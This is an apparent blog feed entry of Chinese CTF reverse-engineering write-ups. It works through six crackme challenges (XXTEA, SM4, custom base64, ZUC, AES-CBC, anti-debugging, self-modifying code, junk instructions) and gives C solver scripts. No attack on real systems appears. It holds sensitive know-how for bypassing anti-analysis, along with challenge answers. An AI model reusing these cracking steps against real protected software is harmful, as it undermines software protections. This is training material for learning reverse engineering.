<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://gift1a.github.io/atom.xml" rel="self"/>
  
  <link href="https://gift1a.github.io/"/>
  <updated>2022-04-20T01:54:20.152Z</updated>
  <id>https://gift1a.github.io/</id>
  
  <author>
    <name>Gift1a</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUU刷题记录</title>
    <link href="https://gift1a.github.io/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://gift1a.github.io/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2022-04-18T06:51:41.000Z</published>
    <updated>2022-04-20T01:54:20.152Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span> <h1 id="红帽杯-XX"><a href="#红帽杯-XX" class="headerlink" title="红帽杯-XX"></a>红帽杯-XX</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>xxtea、异或、换位</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>整个过程就是取前四个输入作为密钥，先进行XXTEA加密，然后位置互换混淆，最后进行异或加密</p><h3 id="取密钥"><a href="#取密钥" class="headerlink" title="取密钥"></a>取密钥</h3><p>这里判断取出前四位，判断是否为数组内的元素，因为如果不是的话，最后V11=V14退出程序</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650329798015.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650329952441.png" alt="v6元素"></p><p>取出地址中存储的字符，保证其不为0，下面那个循环是将取出的key末尾填充0</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330081892.png"></p><p>我们的key是int型，这里传参时强制转为char型</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330189857.png"></p><p>函数内部起始段是将我们传入的key转为int型，转换大小端序，因为原本是flag，转为int之后就变成了galf</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330259305.png"></p><p>然后xxtea加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330294507.png"></p><h3 id="打乱位置"><a href="#打乱位置" class="headerlink" title="打乱位置"></a>打乱位置</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330367612.png"></p><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330508850.png" alt="index初始值"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650330454278.png"></p><p>这段的逻辑就是只要是3的倍数就取出来异或，index从1开始，所以0、1、2下标的字符都不会被加密，3、4、5进行一次加密，异或的值为下标为0的enc_flag，6、7、8则两次，异或的值为下标为0、1的加密后的字符，依次往后，直到21、22、23，此时异或前六位加密字符</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>xxtea</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;string.&gt;#define xxtea_DELTA 0x9e3779b9#define xxtea_MX (((xxtea_z&gt;&gt;5^xxtea_y&lt;&lt;2) + (xxtea_y&gt;&gt;3^xxtea_z&lt;&lt;4)) ^ ((xxtea_sum^xxtea_y) + (xxtea_key[(xxtea_p&amp;3)^xxtea_e] ^ xxtea_z)))void xxtea(uint32_t* xxtea_origin, int xxtea_n, uint32_t const xxtea_key[4]){    uint32_t xxtea_y, xxtea_z, xxtea_sum;    unsigned xxtea_p, xxtea_rounds, xxtea_e;    if (xxtea_n &gt; 1)            /* Coding Part */    {        xxtea_rounds = 6 + 52 / xxtea_n;        xxtea_sum = 0;        xxtea_z = xxtea_origin[xxtea_n - 1];        do        {            xxtea_sum += xxtea_DELTA;            xxtea_e = (xxtea_sum &gt;&gt; 2) &amp; 3;            for (xxtea_p = 0; xxtea_p &lt; xxtea_n - 1; xxtea_p++)            {                xxtea_y = xxtea_origin[xxtea_p + 1];                xxtea_z = xxtea_origin[xxtea_p] += xxtea_MX;            }            xxtea_y = xxtea_origin[0];            xxtea_z = xxtea_origin[xxtea_n - 1] += xxtea_MX;        } while (--xxtea_rounds);    }    else if (xxtea_n &lt; -1)      /* Decoding Part */    {        xxtea_n = -xxtea_n;        xxtea_rounds = 6 + 52 / xxtea_n;        xxtea_sum = xxtea_rounds * xxtea_DELTA;        xxtea_y = xxtea_origin[0];        do        {            xxtea_e = (xxtea_sum &gt;&gt; 2) &amp; 3;            for (xxtea_p = xxtea_n - 1; xxtea_p &gt; 0; xxtea_p--)            {                xxtea_z = xxtea_origin[xxtea_p - 1];                xxtea_y = xxtea_origin[xxtea_p] -= xxtea_MX;            }            xxtea_z = xxtea_origin[xxtea_n - 1];            xxtea_y = xxtea_origin[0] -= xxtea_MX;            xxtea_sum -= xxtea_DELTA;        } while (--xxtea_rounds);    }}int main(){    //0x40CEA5BC,0xE7B2B2F4,0x129D12A9,0x5BC810AE,0x1D06D73D,0xDCF800DCunsigned int enc[6] = { 0x40CEA5BC,0xE7B2B2F4,0x129D12A9,0x5BC810AE,0x1D06D73D,0xDCF870DC };unsigned int key[4] = { (unsigned int)0x67616c66,(unsigned int)0x0,(unsigned int)0x0,(unsigned int)0x0 };    xxtea(enc, -6, key);    for (int i = 0; i &lt; 6; ++i)    {        printf("%c%c%c%c",((char*)&amp;enc[i])[0], ((char*)&amp;enc[i])[1], ((char*)&amp;enc[i])[2], ((char*)&amp;enc[i])[3]);    }//强制转为char然后依次取出，这样就不会逆序了return 0;}</code></pre><p>异或和位置互换</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(){unsigned char data[24] = {0xCE, 0xBC, 0x40, 0x6B, 0x7C, 0x3A, 0x95, 0xC0, 0xEF, 0x9B, 0x20, 0x20, 0x91, 0xF7, 0x02, 0x35,0x23, 0x18, 0x02, 0xC8, 0xE7, 0x56, 0x56, 0xFA};int count = 0;for (int i = 23; i &gt;= 0; --i)//因为最后的加密数据和前面的有关系，所以要从前往后{for (int j = 6 - count; j &gt;= 0; --j)//并且分为了多轮，除去前三个不需要异或，剩下7组，又是小于8，所以从下标为6开始{data[i] ^= data[j];}if (i % 3 == 0){count++;}}char encode_flag2[24] = { 0 };//交换还原encode_flag2[2]= *data;*encode_flag2= data[1];encode_flag2[3]= data[2];encode_flag2[1]= data[3];encode_flag2[6]= data[4];encode_flag2[4]= data[5];encode_flag2[7]= data[6];encode_flag2[5]= data[7];encode_flag2[10]= data[8];encode_flag2[8]= data[9];encode_flag2[11]= data[10];encode_flag2[9]= data[11];encode_flag2[14]= data[12];encode_flag2[12]= data[13];encode_flag2[15]= data[14];encode_flag2[13]= data[15];encode_flag2[18]= data[16];encode_flag2[16]= data[17];encode_flag2[19]= data[18];encode_flag2[17]= data[19];encode_flag2[22]= data[20];encode_flag2[20]=data[21] ;encode_flag2[23]= data[22];for (int i = 0; i &lt; 24; ++i){printf("0x%X,", encode_flag2[i]&amp;0xff);}return 0;}</code></pre><h1 id="安洵杯-2019-crackMe"><a href="#安洵杯-2019-crackMe" class="headerlink" title="[安洵杯 2019]crackMe"></a>[安洵杯 2019]crackMe</h1><h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><p>SM4、Base64变表加密、换位</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>这里我和别人不一样，我运行不了程序，所以没办法动调，只能X查看交叉引用</p><p>进去定位到主加密函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333197817.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333231195.png"></p><h3 id="初始化密钥"><a href="#初始化密钥" class="headerlink" title="初始化密钥"></a>初始化密钥</h3><p>对key查看交叉引用，可以进入这里，看一下对赋值后的字符串处理</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333257430.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333345804.png"></p><p>通过FindCrypt可以知道是SM4加密，所以这一段就是初始化密钥了</p><h3 id="SM4加密"><a href="#SM4加密" class="headerlink" title="SM4加密"></a>SM4加密</h3><p>回到encode函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333436418.png"></p><p>可以发现最后将加密后的字符串给到了final</p><h3 id="Base64加密"><a href="#Base64加密" class="headerlink" title="Base64加密"></a>Base64加密</h3><p>对final查看交叉引用，发现对其进行了加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333588664.png"></p><p>这里解释一下一些东西</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333635363.png"></p><blockquote><p><strong>我们base64就是将三个字符也就是24位转为4个6位，做索引，这里使用移位直接将三个字符成为一个int型，也就是每个左移8位，而待会取出的时候右移四位即可取出，实现了8位与6位的转换，比较有意思</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333792600.png"></p><p>在红框函数中将传入的6位索引进行+24，也就是(index+24)%64，我们可以将base64表整体左移，就相当于index+24了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333896782.png"></p><p>再对base64表查看交叉引用，发现了将大小写转换</p><h3 id="换位"><a href="#换位" class="headerlink" title="换位"></a>换位</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650333519884.png"></p><p>可以看到这里将最后用来对比的字符串每两个字符进行互换</p><h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;char base64_table[] = "yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx";char* base64_encode(char code[], char str[]){int code_len = strlen(code);int str_len ;if (code_len%3){str_len = (code_len / 3 + 1 ) * 4;}elsestr_len = (code_len / 3) * 4;int i = 0, i_ = 0;for (; i &lt; code_len; i += 3, i_ += 4){str[i_] = base64_table[code[i]&gt;&gt; 2];str[i_ + 1] = base64_table[((code[i] &amp; 0x03) &lt;&lt; 4) | ((code[i + 1] &amp; 0xf0) &gt;&gt; 4)];str[i_ + 2] = base64_table[((code[i+1] &amp; 0x0f) &lt;&lt; 2) | ((code[i + 2] &amp; 0xc0) &gt;&gt; 6)];str[i_ + 3] = base64_table[(code[i + 2] &amp; 0x3f)];}if (code_len % 3 == 1){str[i_-1] = '=';str[i_ - 2] = '=';}else if (code_len % 3 == 2){str[i_-1] = '=';}return str;}int findIndex(char c, char b64_table[]){for (int i = 0; i &lt; 64; ++i){if (c == b64_table[i])return i;}}int str_len;char* base64_decode(char code[], char str[], char b64_table[]){char memstr[200] = { 0 };memcpy(memstr, code, strlen(code));int len = strlen(code);if (strstr(code, "=="))str_len = len / 4 * 3 - 2;else if (strstr(code, "="))str_len = len / 4 * 3 - 1;elsestr_len = len / 4 * 3;for (int i = 0, i_ = 0; i &lt; len; i += 4, i_ += 3){str[i_] = (findIndex(memstr[i], b64_table) &lt;&lt; 2) | (findIndex(memstr[i + 1], b64_table) &amp; 0x30) &gt;&gt; 4;str[i_+1]= (findIndex(memstr[i+1], b64_table)&amp;0xf)&lt;&lt;4 | (findIndex(memstr[i + 2], b64_table) &amp; 0x3c) &gt;&gt; 2;str[i_ + 2] = (findIndex(memstr[i + 2], b64_table) &amp; 0x03) &lt;&lt; 6 | (findIndex(memstr[i + 3], b64_table));}str[str_len] = 0;return str;}int main(){char code[100] = "1UTAOIkpyOSWGv/mOYFY4R==";char decode[100] = { 0 };char encode[100] = { 0 };//两位交换for (int i = 0; i &lt; strlen(code); i += 2){char v2 = code[i];code[i] = code[i + 1];code[i + 1] = v2;                         // 每两个之间进行交换}/*base64_encode(code, encode); printf("%s\n", encode);*/base64_decode(code, decode,base64_table);if (decode == 0){return 0;}for (int i = 0; i &lt; str_len; ++i){printf("%02X", decode[i] &amp; 0xff);}return 0;}</code></pre><p>得到59D095290DF2400614F48D276906874E</p><p>SM4解密</p><p><a href="https://the-x.cn/cryptography/Sm4.aspx">https://the-x.cn/cryptography/Sm4.aspx</a></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650334038696.png"></p><h1 id="SWPU2019-ReverseMe"><a href="#SWPU2019-ReverseMe" class="headerlink" title="[SWPU2019]ReverseMe"></a>[SWPU2019]ReverseMe</h1><h2 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h2><p>异或、ZUC算法</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>先异或SWPU_2019_CTF，再异或ZUC算法生成的数据</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350768675.png" alt="异或"></p><p>ZUC算法生成异或的值</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350800049.png"></p><p>unsigned int 的异或，通过动调也可以知道</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650350725823.png" alt="xor"></p><h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-c" data-language="c"><code class="language-c">unsigned int data[8] = {0xCA3E0C86, 0x19AED798, 0xA66B77E2, 0xB077A16A, 0x05379169, 0x307BF97A, 0x104B5A43, 0x28D47D86};unsigned int final[8] = {0xF80F37B3, 0x5DAEBCBC, 0x864D5ABA, 0xD3629744, 0x1624BA4F, 0x1A729F0B, 0x266D6865, 0x67C86BBA};int j = 0;char k[] = { 0 };for (int i = 0; i &lt; 8; ++i){final[i] ^= data[i];k[j++] = ((char*)&amp;final[i])[0];k[j++] = ((char*)&amp;final[i])[1];k[j++] = ((char*)&amp;final[i])[2];k[j++] = ((char*)&amp;final[i])[3];}k[j] = 0;char key[] = "SWPU_2019_CTF";for (int i = 0; i &lt; 32; ++i){k[i] ^= key[i % 13];printf("%c", k[i]);}</code></pre><h1 id="MRCTF2020-EasyCpp"><a href="#MRCTF2020-EasyCpp" class="headerlink" title="[MRCTF2020]EasyCpp"></a>[MRCTF2020]EasyCpp</h1><h2 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h2><p>异或、替换，素因数分解</p><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>一些关键的都已经标识出来了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331362066.png"></p><h3 id="读取输入"><a href="#读取输入" class="headerlink" title="读取输入"></a>读取输入</h3><p>读取9次key，并且拼接起来</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331630377.png"></p><h3 id="异或-1"><a href="#异或-1" class="headerlink" title="异或"></a>异或</h3><p>这里面是和1异或</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331969448.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650331929652.png"></p><h3 id="素因数分解"><a href="#素因数分解" class="headerlink" title="素因数分解"></a>素因数分解</h3><p>这里只要能整除i，就重新进入递归，参数为整除i后的数，如果i遍历完不符合，结束循环，然后拼接上空格</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332066496.png"></p><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332316391.png"></p><p>将数字换成字母，空格换为=</p><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>红框数组存储的是最后比较的字符串</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650332398066.png"></p><h2 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h2><p>这里我直接手动替换算出来的</p><pre class="language-c" data-language="c"><code class="language-c">printf("%d", (293 * 8) ^ 1);printf("%d", (1223) ^ 1);printf("%d", (11 * 7 * 5 * 5 * 3) ^ 1);printf("%d", (2477) ^ 1); printf("%d", (125 * 27) ^ 1);printf("%d", (3 * 3011) ^ 1);printf("%d", (13 * 7 * 27) ^ 1);printf("%d", (353 * 5 * 2) ^ 1);</code></pre><p>md5即可</p><h1 id="SCTF2019-Creakme"><a href="#SCTF2019-Creakme" class="headerlink" title="SCTF2019-Creakme"></a>SCTF2019-Creakme</h1><h2 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h2><p>AES-CBC加密、Base64加密、反调试、SMC</p><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><h3 id="反调试、SMC"><a href="#反调试、SMC" class="headerlink" title="反调试、SMC"></a>反调试、SMC</h3><p>一看到这种遍历段名称的操作，熟悉SMC自解密的应该知道这是敏感的操作，也就是解密操作</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335524731.png"></p><p>对于这种在输入开始前的反调试，采用attach to process</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335425994.png" alt="反调试"></p><p>可以看到如果不是调试状态，就将数据强制转为函数指针</p><p>这里已经解密完并执行完程序了</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335630803.png"></p><p>对其交叉引用可以看到</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650335692377.png"></p><h3 id="AES-CBC、Base64加密"><a href="#AES-CBC、Base64加密" class="headerlink" title="AES-CBC、Base64加密"></a>AES-CBC、Base64加密</h3><p>动调发现这就是加密函数</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336067526.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336317921.png" alt="AES-CBC"></p><p>可以知道该函数就是初始化密钥</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336575248.png"></p><p>从这里的明文异或结合CBC可以知道是CBC模式</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337171206.png" alt="明文异或"></p><p>key和iv分别为sycloversyclover、sctfsctfsctfsctf</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336622490.png" alt="iv"></p><p>这里很多this指针，但是我们还是可以通过一些特征以及FindCrypt发现这是AES中的key的初始化</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336696808.png"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336732282.png" alt="轮常量异或"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336808010.png" alt="S表替换"></p><p>AES-CBC加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337454010.png" alt="明文与iv向量的异或"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337280514.png" alt="内部加密"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336891802.png" alt="base64"></p><p>进入该函数中，明显是base64加密</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336933402.png"></p><p>找到码表，发现没有被改过 </p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650336989928.png"></p><h3 id="比较-1"><a href="#比较-1" class="headerlink" title="比较"></a>比较</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337016203.png"></p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650337028435.png"></p><h1 id="SCTF2019-babyre"><a href="#SCTF2019-babyre" class="headerlink" title="SCTF2019-babyre"></a>SCTF2019-babyre</h1><h2 id="考点-5"><a href="#考点-5" class="headerlink" title="考点"></a>考点</h2><p>base64解密、Maze、移位与异或、花指令</p><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>花指令就不说了，全部都是一样的，去除即可</p><p>迷宫也没啥说的，注意这里是三维迷宫 <strong>ddwwxxssxaxwwaasasyywwdd</strong> </p><h3 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h3><p>可以看到这里先将我们的输入去table找索引，然后&amp;0x3F取出最后的六位，按位与上v5左移6，这样就得到了8位的字符，加上=4的判断，类似于base64的解密操作</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650339409043.png"></p><p>直接将最后的字符串加密即可<strong>c2N0Zl85MTAy</strong></p><h3 id="换位异或"><a href="#换位异或" class="headerlink" title="换位异或"></a>换位异或</h3><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340193709.png"></p><p>加密流程：每四个输入存入int型的变量，然后进行xor_enc加密，将前四个字符加密后存放到第四个字符的后一个字符，依次往后。</p><blockquote><p><strong>之所以要这样进行移位是因为如果强制转为int型，由于小端序，存储的时候是12345678，这样int取出的时候就变成了4321</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340446709.png" alt="xor_enc"></p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340461185.png"></p><p>xor_enc加密流程：将第二第三第四个字符进行异或，分为四个字节去table找到对应的值，然后重新组合成int型，再经过一系列左移右移异或操作并返回，再将返回值与第一个字符异或，这样就得到了一个加密后的结果，这里要一直等到index&lt;=29，也就是前四个字符不会加密</p><p>我们可以看到这里v10只有26，那么26、27、28、29下标的v10就赋值给了v11、v12、v13、v14</p><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340936262.png"></p><p>取出最后四个int型存储的十六个字节，存储到enc_flag数组，然后比较</p><blockquote><p><strong>假设int a=0x12345678,那么HIBYTE(a)=0x12,BYTE2(a)=0x34,BYTE1(a)=0x56</strong></p></blockquote><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650340991543.png"></p><p>这样我们就知道了最后的四个int型的元素，往前推，29是怎么来的呢，是flag[25]^enc(flag[26],flag[27],flag[28])得到的，所以flag[29]^enc(flag[26],flag[27],flag[28])即可得到flag[25]，前面的元素同理</p><h2 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h2><p>因为涉及了ida的左右移位操作，而ida目录下defs.h有定义，所以可以直接引用</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include"defs.h"unsigned int v3[273] = {    0x000000D6, 0x00000090, 0x000000E9, 0x000000FE, 0x000000CC, 0x000000E1, 0x0000003D, 0x000000B7,    0x00000016, 0x000000B6, 0x00000014, 0x000000C2, 0x00000028, 0x000000FB, 0x0000002C, 0x00000005,    0x0000002B, 0x00000067, 0x0000009A, 0x00000076, 0x0000002A, 0x000000BE, 0x00000004, 0x000000C3,    0x000000AA, 0x00000044, 0x00000013, 0x00000026, 0x00000049, 0x00000086, 0x00000006, 0x00000099,    0x0000009C, 0x00000042, 0x00000050, 0x000000F4, 0x00000091, 0x000000EF, 0x00000098, 0x0000007A,    0x00000033, 0x00000054, 0x0000000B, 0x00000043, 0x000000ED, 0x000000CF, 0x000000AC, 0x00000062,    0x000000E4, 0x000000B3, 0x0000001C, 0x000000A9, 0x000000C9, 0x00000008, 0x000000E8, 0x00000095,    0x00000080, 0x000000DF, 0x00000094, 0x000000FA, 0x00000075, 0x0000008F, 0x0000003F, 0x000000A6,    0x00000047, 0x00000007, 0x000000A7, 0x000000FC, 0x000000F3, 0x00000073, 0x00000017, 0x000000BA,    0x00000083, 0x00000059, 0x0000003C, 0x00000019, 0x000000E6, 0x00000085, 0x0000004F, 0x000000A8,    0x00000068, 0x0000006B, 0x00000081, 0x000000B2, 0x00000071, 0x00000064, 0x000000DA, 0x0000008B,    0x000000F8, 0x000000EB, 0x0000000F, 0x0000004B, 0x00000070, 0x00000056, 0x0000009D, 0x00000035,    0x0000001E, 0x00000024, 0x0000000E, 0x0000005E, 0x00000063, 0x00000058, 0x000000D1, 0x000000A2,    0x00000025, 0x00000022, 0x0000007C, 0x0000003B, 0x00000001, 0x00000021, 0x00000078, 0x00000087,    0x000000D4, 0x00000000, 0x00000046, 0x00000057, 0x0000009F, 0x000000D3, 0x00000027, 0x00000052,    0x0000004C, 0x00000036, 0x00000002, 0x000000E7, 0x000000A0, 0x000000C4, 0x000000C8, 0x0000009E,    0x000000EA, 0x000000BF, 0x0000008A, 0x000000D2, 0x00000040, 0x000000C7, 0x00000038, 0x000000B5,    0x000000A3, 0x000000F7, 0x000000F2, 0x000000CE, 0x000000F9, 0x00000061, 0x00000015, 0x000000A1,    0x000000E0, 0x000000AE, 0x0000005D, 0x000000A4, 0x0000009B, 0x00000034, 0x0000001A, 0x00000055,    0x000000AD, 0x00000093, 0x00000032, 0x00000030, 0x000000F5, 0x0000008C, 0x000000B1, 0x000000E3,    0x0000001D, 0x000000F6, 0x000000E2, 0x0000002E, 0x00000082, 0x00000066, 0x000000CA, 0x00000060,    0x000000C0, 0x00000029, 0x00000023, 0x000000AB, 0x0000000D, 0x00000053, 0x0000004E, 0x0000006F,    0x000000D5, 0x000000DB, 0x00000037, 0x00000045, 0x000000DE, 0x000000FD, 0x0000008E, 0x0000002F,    0x00000003, 0x000000FF, 0x0000006A, 0x00000072, 0x0000006D, 0x0000006C, 0x0000005B, 0x00000051,    0x0000008D, 0x0000001B, 0x000000AF, 0x00000092, 0x000000BB, 0x000000DD, 0x000000BC, 0x0000007F,    0x00000011, 0x000000D9, 0x0000005C, 0x00000041, 0x0000001F, 0x00000010, 0x0000005A, 0x000000D8,    0x0000000A, 0x000000C1, 0x00000031, 0x00000088, 0x000000A5, 0x000000CD, 0x0000007B, 0x000000BD,    0x0000002D, 0x00000074, 0x000000D0, 0x00000012, 0x000000B8, 0x000000E5, 0x000000B4, 0x000000B0,    0x00000089, 0x00000069, 0x00000097, 0x0000004A, 0x0000000C, 0x00000096, 0x00000077, 0x0000007E,    0x00000065, 0x000000B9, 0x000000F1, 0x00000009, 0x000000C5, 0x0000006E, 0x000000C6, 0x00000084,    0x00000018, 0x000000F0, 0x0000007D, 0x000000EC, 0x0000003A, 0x000000DC, 0x0000004D, 0x00000020,    0x00000079, 0x000000EE, 0x0000005F, 0x0000003E, 0x000000D7, 0x000000CB, 0x00000039, 0x00000048,    0x000000C6, 0x000000BA, 0x000000B1, 0x000000A3, 0x00000050, 0x00000033, 0x000000AA, 0x00000056,    0x00000097, 0x00000091, 0x0000007D, 0x00000067, 0x000000DC, 0x00000022, 0x00000070, 0x000000B2,};unsigned int encode(unsigned int xor_final){    int v2 = (v3[BYTE2(xor_final)] &lt;&lt; 16) | v3[(unsigned __int8)xor_final] | (v3[BYTE1(xor_final)] &lt;&lt; 8) | (v3[HIBYTE(xor_final)] &lt;&lt; 24);    return __ROL4__(v2, 12) ^ (unsigned int)(__ROL4__(v2, 8) ^ __ROR4__(v2, 2)) ^ __ROR4__(v2, 6);}int main(){    unsigned v10[30] = { 0 };    v10[26] = 0xBE040680;    v10[27] = 0xC5AF7647;    v10[28] = 0x9FCC401F;    v10[29] = 0xD8BF92EF;    for (int i = 25; i &gt;= 0; --i)    {        v10[i] = v10[i + 4] ^ encode(v10[i + 1]^v10[i + 2]^v10[i + 3]);    }    for (int i = 0; i &lt; 4; ++i)    {        printf("%c%c%c%c",((char*)(&amp;v10[i]))[0], ((char*)(&amp;v10[i]))[1], ((char*)(&amp;v10[i]))[2], ((char*)(&amp;v10[i]))[3]);    } return 0;}</code></pre><p><img src="/2022/04/18/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/1650342054912.png"></p><p>这样子就不会存在int型读取时小端序的问题</p><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt; 

